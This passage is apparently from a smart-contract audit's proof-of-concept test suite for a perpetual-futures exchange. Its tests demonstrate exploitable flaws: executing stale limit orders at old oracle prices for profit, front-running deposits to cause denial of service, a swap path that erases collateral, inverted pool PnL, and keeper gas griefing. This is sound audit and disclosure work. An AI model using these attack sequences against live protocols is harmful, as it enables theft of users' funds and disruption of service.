    expect(order.numbers.sizeDeltaUsd).to.eq(expandFloatDecimals(99 * 1000));
  });

  it("CRITICAL::GLOBAL-2 hold off limit position with insufficient reserves, deposit, then execute when favorable", async () => {
    await weth.mint(orderStore.address, expandDecimals(25, 18));

    let wethBalBefore = await getBalanceOf(weth.address, user0.address);

    expect(await orderStore.getOrderCount()).eq(0);
    const params = {
      market: ethUsdMarket.marketToken,
      initialCollateralToken: weth.address,
      swapPath: [],
      sizeDeltaUsd: expandFloatDecimals(4000 * 1000),
      acceptablePrice: expandDecimals(2000, 12),
      acceptableUsdAdjustment: expandDecimals(-5, 12),
      executionFee: expandDecimals(0, 15),
      minOutputAmount: expandDecimals(0, 18),
      orderType: OrderType.LimitIncrease,
      isLong: true,
      hasCollateralInETH: false,
    };
    await orderHandler.connect(wallet).createOrder(user0.address, params);
    // Confirmed order is stored
    expect(await orderStore.getOrderCount()).eq(1);

    let orderKeys = await orderStore.getOrderKeys(0, 1);
    let order = await orderStore.get(orderKeys[0]);

    let oracleBlockNumber = order.numbers.updatedAtBlock;
    let block = await provider.getBlock(oracleBlockNumber.toNumber());

    let oracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [oracleBlockNumber, oracleBlockNumber],
      blockHashes: [block.hash, block.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(2000, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });

    await expect(orderHandler.executeOrder(orderKeys[0], oracleParams)).to.be.revertedWithCustomError(
      increaseOrderUtils,
      "InsufficientReserve"
    );
    // Order still exists ... even with insufficient reserves
    orderKeys = await orderStore.getOrderKeys(0, 1);
    order = await orderStore.get(orderKeys[0]);
    expect(order.flags.orderType).to.eq(3); // LimitIncrease

    await hre.network.provider.send("hardhat_mine", ["0x14"]); // move forward 20 blocks

    // Create deposit so our Increase order can be executed afterwards
    await weth.mint(depositStore.address, expandDecimals(5000, 18));
    await depositHandler
      .connect(wallet)
      .createDeposit(user0.address, ethUsdMarket.marketToken, 100, false, expandDecimals(0, 15));
    const depositKeys = await depositStore.getDepositKeys(0, 1);
    const deposit = await depositStore.get(depositKeys[0]);

    let depositBlock = await provider.getBlock(deposit.updatedAtBlock.toNumber());

    let depositOracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [depositBlock.number, depositBlock.number],
      blockHashes: [depositBlock.hash, depositBlock.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(5000, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });

    let marketTokenBalBefore = await getBalanceOf(ethUsdMarket.marketToken, user0.address);
    await depositHandler.executeDeposit(depositKeys[0], depositOracleParams);
    let marketTokenBalAfter = await getBalanceOf(ethUsdMarket.marketToken, user0.address);
    expect(marketTokenBalBefore).to.be.lessThan(marketTokenBalAfter);
    // Execute LimitIncrease now that reserves have been increased
    // Notice that the oracle provides prices from when ether was valued at $2,000
    // This follows the behavior explained for retroactively executing orders
    await orderHandler.executeOrder(orderKeys[0], oracleParams);

    let posKeys = await positionStore.getPositionKeys(0, 1);
    let pos = await positionStore.get(posKeys[0]);
    // Confirmed we have our position
    expect(pos.sizeInUsd).to.eq(expandFloatDecimals(4000 * 1000));

    const marketDecreaseParams = {
      market: ethUsdMarket.marketToken,
      initialCollateralToken: weth.address,
      swapPath: [],
      sizeDeltaUsd: pos.sizeInUsd,
      acceptablePrice: expandDecimals(2000, 12),
      acceptableUsdAdjustment: expandDecimals(-5, 12),
      executionFee: expandDecimals(0, 15),
      minOutputAmount: expandDecimals(0, 18),
      orderType: OrderType.MarketDecrease,
      isLong: true,
      hasCollateralInETH: false,
    };
    await orderHandler.connect(wallet).createOrder(user0.address, marketDecreaseParams);
    orderKeys = await orderStore.getOrderKeys(0, 1);
    order = await orderStore.get(orderKeys[0]);

    oracleBlockNumber = order.numbers.updatedAtBlock;
    block = await provider.getBlock(oracleBlockNumber.toNumber());

    let newOracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [oracleBlockNumber, oracleBlockNumber],
      blockHashes: [block.hash, block.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(10000, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });

    await orderHandler.executeOrder(orderKeys[0], newOracleParams);
    let wethBalAfter = await getBalanceOf(weth.address, user0.address);
    // Easy profit
    expect(Number(ethers.utils.formatEther(wethBalAfter.sub(wethBalBefore)))).to.be.gt(1000);
  });

  it("MEDIUM:DEPU-1 frontrun deposit with WETH for DoS", async () => {
    // Malicious user sends some weth to deposit store
    await weth.mint(depositStore.address, expandDecimals(1, 18));
    // An unsuspecting user creates a deposit, but the execution fee does not match the weth transferred to the store
    await weth.mint(depositStore.address, executionFee);
    await expect(
      depositHandler.connect(wallet).createDeposit(user0.address, btcUsdMarket.marketToken, 100, false, executionFee)
    ).to.be.revertedWith("DepositUtils: invalid wethAmount");
  });

  it("CRITICAL::DOU-2 Swap path loses all my money ", async () => {
    await usdc.mint(orderStore.address, expandDecimals(50000, 6));

    expect(await weth.balanceOf(user0.address)).eq(0);

    expect(await orderStore.getOrderCount()).eq(0);
    let params = {
      market: ethUsdMarket.marketToken,
      initialCollateralToken: usdc.address,
      swapPath: [],
      sizeDeltaUsd: expandFloatDecimals(50000),
      acceptablePrice: 0,
      acceptableUsdAdjustment: expandDecimals(-5, 12),
      executionFee: expandDecimals(0, 15),
      minOutputAmount: 0,
      orderType: OrderType.MarketIncrease,
      isLong: true,
      hasCollateralInETH: false,
    };
    await orderHandler.connect(wallet).createOrder(user0.address, params);

    let orderKeys = await orderStore.getOrderKeys(0, 1);

    let order = await orderStore.get(orderKeys[0]);

    let oracleBlockNumber = order.numbers.updatedAtBlock;
    let block = await provider.getBlock(oracleBlockNumber.toNumber());

    let oracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [oracleBlockNumber, oracleBlockNumber],
      blockHashes: [block.hash, block.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(1000, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });

    // Make our position
    await orderHandler.executeOrder(orderKeys[0], oracleParams);

    block = await provider.getBlock();

    expect(await weth.balanceOf(user0.address)).eq(0);

    expect(await orderStore.getOrderCount()).eq(0);
    params = {
      market: ethUsdMarket.marketToken,
      initialCollateralToken: usdc.address,
      swapPath: [ethUsdMarket.marketToken],
      sizeDeltaUsd: expandFloatDecimals(50000),
      acceptablePrice: 0,
      acceptableUsdAdjustment: expandDecimals(-5, 12),
      executionFee: expandDecimals(0, 15),
      minOutputAmount: 0,
      orderType: OrderType.MarketDecrease,
      isLong: true,
      hasCollateralInETH: false,
    };

    // Create a market decrease order, with a specified swap path
    await orderHandler.connect(wallet).createOrder(user0.address, params);

    orderKeys = await orderStore.getOrderKeys(0, 1);
    order = await orderStore.get(orderKeys[0]);
    oracleBlockNumber = order.numbers.updatedAtBlock;
    block = await provider.getBlock(oracleBlockNumber.toNumber());

    oracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [oracleBlockNumber, oracleBlockNumber],
      blockHashes: [block.hash, block.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(1000, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });

    // Execute our decrease order with a specified swap path
    await orderHandler.executeOrder(orderKeys[0], oracleParams);

    // We no longer have a position
    let posKeys = await positionStore.getPositionKeys(0, 1);
    expect(posKeys.length).to.eq(0);
    // AND we don't get any of our collateral back
    expect(await weth.balanceOf(user0.address)).eq(0);
    expect(await usdc.balanceOf(user0.address)).eq(0);
    // *******************************************************

    // Now let's try with WETH as initial collateral token
    await weth.mint(orderStore.address, expandDecimals(10, 18));

    block = await provider.getBlock();
    expect(await weth.balanceOf(user0.address)).eq(0);
    expect(await orderStore.getOrderCount()).eq(0);
    params = {
      market: ethUsdMarket.marketToken,
      initialCollateralToken: weth.address,
      swapPath: [],
      sizeDeltaUsd: expandFloatDecimals(50000),
      acceptablePrice: 0,
      acceptableUsdAdjustment: expandDecimals(-5, 12),
      executionFee: expandDecimals(0, 15),
      minOutputAmount: 0,
      orderType: OrderType.MarketIncrease,
      isLong: true,
      hasCollateralInETH: false,
    };
    await orderHandler.connect(wallet).createOrder(user0.address, params);

    orderKeys = await orderStore.getOrderKeys(0, 1);

    order = await orderStore.get(orderKeys[0]);

    oracleBlockNumber = order.numbers.updatedAtBlock;
    block = await provider.getBlock(oracleBlockNumber.toNumber());

    oracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [oracleBlockNumber, oracleBlockNumber],
      blockHashes: [block.hash, block.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(1000, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });

    await orderHandler.executeOrder(orderKeys[0], oracleParams);

    block = await provider.getBlock();

    expect(await weth.balanceOf(user0.address)).eq(0);

    expect(await orderStore.getOrderCount()).eq(0);
    params = {
      market: ethUsdMarket.marketToken,
      initialCollateralToken: weth.address,
      swapPath: [ethUsdMarket.marketToken],
      sizeDeltaUsd: expandFloatDecimals(50000),
      acceptablePrice: 0,
      acceptableUsdAdjustment: expandDecimals(-5, 12),
      executionFee: expandDecimals(0, 15),
      minOutputAmount: 0,
      orderType: OrderType.MarketDecrease,
      isLong: true,
      hasCollateralInETH: false,
    };
    await orderHandler.connect(wallet).createOrder(user0.address, params);

    orderKeys = await orderStore.getOrderKeys(0, 1);
    order = await orderStore.get(orderKeys[0]);
    oracleBlockNumber = order.numbers.updatedAtBlock;
    block = await provider.getBlock(oracleBlockNumber.toNumber());

    oracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [oracleBlockNumber, oracleBlockNumber],
      blockHashes: [block.hash, block.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(1000, 4), expandDecimals(1, 6)],
      signers,
      priceFeedTokens: [],
    });

    await orderHandler.executeOrder(orderKeys[0], oracleParams);

    // We no longer have a position
    posKeys = await positionStore.getPositionKeys(0, 1);
    expect(posKeys.length).to.eq(0);
    // AND we don't get any of our collateral back
    expect(await weth.balanceOf(user0.address)).eq(0);
    expect(await usdc.balanceOf(user0.address)).eq(0);
  });

  it("CRITICAL::MKTU-1 Pool Value uses inverse PnL", async () => {
    await weth.mint(orderStore.address, expandDecimals(50, 18));

    expect(await orderStore.getOrderCount()).eq(0);
    let params = {
      market: ethUsdMarket.marketToken,
      initialCollateralToken: weth.address,
      swapPath: [],
      sizeDeltaUsd: expandFloatDecimals(50000),
      acceptablePrice: 0,
      acceptableUsdAdjustment: expandDecimals(-5, 12),
      executionFee: expandDecimals(0, 15),
      minOutputAmount: 0,
      orderType: OrderType.MarketIncrease,
      isLong: true,
      hasCollateralInETH: false,
    };
    await orderHandler.connect(wallet).createOrder(user0.address, params);

    let orderKeys = await orderStore.getOrderKeys(0, 1);
    let order = await orderStore.get(orderKeys[0]);
    let oracleBlockNumber = order.numbers.updatedAtBlock;
    let block = await provider.getBlock(oracleBlockNumber.toNumber());

    let oracleParams = await getOracleParams({
      oracleSalt,
      oracleBlockNumbers: [oracleBlockNumber, oracleBlockNumber],
      blockHashes: [block.hash, block.hash],
      signerIndexes,
      tokens: [weth.address, usdc.address],
      prices: [expandDecimals(1000, 4), expandDecimals(1, 6)], // WETH trading at $1,000
      signers,
      priceFeedTokens: [],
    });

    // Make our $50,000 position
    await orderHandler.executeOrder(orderKeys[0], oracleParams);

    // Market token prices decrease with unrealized loss, and increase with unrealized profit
    // This is due to the change in pool value, as market token supply stays the same.
    expect(
      await reader.getMarketTokenPrice(
        dataStore.address,
        ethUsdMarket,
        expandDecimals(500, 4 + 8), // loss for trader
        expandDecimals(1, 6 + 18),
        expandDecimals(500, 4 + 8)
      )
    ).to.be.lt(
      await reader.getMarketTokenPrice(
        dataStore.address,
        ethUsdMarket,
        expandDecimals(2000, 4 + 8), // profit for trader
        expandDecimals(1, 6 + 18),
        expandDecimals(2000, 4 + 8)
      )
    );
  });

  it("HIGH::ORDH-1 Spam non-executable orders to waste keeper gas", async () => {
    // Configure the gas validation parameters to simply nonzero amounts
    await dataStore.setUint(await keys.ESTIMATED_FEE_BASE_GAS_LIMIT(), 1);
    await dataStore.setUint(await keys.ESTIMATED_FEE_MULTIPLIER_FACTOR(), 1);

    expect(await orderStore.getOrderCount()).eq(0);
    const params = {
      market: ethUsdMarket.marketToken,
      initialCollateralToken: usdc.address,
      swapPath: [],
      sizeDeltaUsd: expandFloatDecimals(1000 * 1000),
      acceptablePrice: expandDecimals(5000, 12),
      acceptableUsdAdjustment: 0,
      executionFee: 0, // Execution fee is 0
      minOutputAmount: expandDecimals(0, 18),
      orderType: OrderType.MarketIncrease,
      isLong: true,
      hasCollateralInETH: false,
    };

    // Provide 0 amountIn
    await exchangeRouter.connect(user0).createOrder(params, 0);
    await exchangeRouter.connect(user0).createOrder(params, 0);
    await exchangeRouter.connect(user0).createOrder(params, 0);
    await exchangeRouter.connect(user0).createOrder(params, 0);

    // User is able to create some orders that have no executionFee atached
    expect(await orderStore.getOrderCount()).eq(4);

    let keeperBalBefore = await provider.getBalance(wallet.address);
    let userBalBefore = await provider.getBalance(user0.address);

    let orderKeys = await orderStore.getOrderKeys(0, 4);
    // Try executing all of these orders
    for (let i = 0; i < orderKeys.length; i++) {
      let order = await orderStore.get(orderKeys[i]);

      let oracleBlockNumber = order.numbers.updatedAtBlock;
      let block = await provider.getBlock(oracleBlockNumber.toNumber());

      let oracleParams = await getOracleParams({
        oracleSalt,
        oracleBlockNumbers: [oracleBlockNumber, oracleBlockNumber],
        blockHashes: [block.hash, block.hash],
        signerIndexes,
        tokens: [weth.address, usdc.address],
        prices: [expandDecimals(5000, 4), expandDecimals(1, 6)],
        signers,
        priceFeedTokens: [],
      });

      // The orders fail because there is not a valid executionFee attached
      await expect(orderHandler.executeOrder(orderKeys[i], oracleParams)).to.be.revertedWithCustomError(
        gasUtils,
        "InsufficientExecutionFee"
      );
    }

    let posKeys = await positionStore.getPositionKeys(0, 1);
    expect(posKeys.length).to.equal(0);

    let keeperBalAfterRound1 = await provider.getBalance(wallet.address);
    expect(keeperBalAfterRound1).to.be.lt(keeperBalBefore); // Keeper gas wasted

    // But the orders still exist as well, because try/catch does not
    // catch the custom revert and cancel the orders
    expect(await orderStore.getOrderCount()).eq(4);

    // Kepeer tries again to execute the orders
    for (let i = 0; i < orderKeys.length; i++) {
      let order = await orderStore.get(orderKeys[i]);

      let oracleBlockNumber = order.numbers.updatedAtBlock;
      let block = await provider.getBlock(oracleBlockNumber.toNumber());

      let oracleParams = await getOracleParams({
        oracleSalt,
        oracleBlockNumbers: [oracleBlockNumber, oracleBlockNumber],
        blockHashes: [block.hash, block.hash],
        signerIndexes,
        tokens: [weth.address, usdc.address],
        prices: [expandDecimals(5000, 4), expandDecimals(1, 6)],
        signers,
        priceFeedTokens: [],
      });

      await expect(orderHandler.executeOrder(orderKeys[i], oracleParams)).to.be.revertedWithCustomError(
        gasUtils,
        "InsufficientExecutionFee"
      );
    }

    let keeperBalAfterRound2 = await provider.getBalance(wallet.address);
    expect(keeperBalAfterRound2).to.be.lt(keeperBalAfterRound1); // Keeper gas wasted
    let userBalAfter = await provider.getBalance(user0.address);
    expect(userBalAfter).to.be.eq(userBalBefore);

    // Orders still in the store, so keeper can once again attempt execution.
    expect(await orderStore.getOrderCount()).eq(4);
  });
});
